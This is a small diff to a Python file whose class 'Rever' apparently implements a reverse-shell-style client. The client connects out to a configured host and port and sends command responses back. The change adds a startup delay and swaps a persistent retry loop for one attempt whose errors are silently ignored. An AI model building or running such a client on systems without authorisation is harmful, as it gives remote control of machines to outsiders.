@@ -207,9 +207,9 @@ class Rever:
                 self.send(response.decode("utf-8"))
 
 if __name__ == "__main__":
+    time.sleep(10)
     c = Rever(str(basic.HOST), int(basic.PORT))
-    while True:
-        try:
-            c.main()
-        except:
-            pass
+
+    try: c.main()
+    except: pass
+
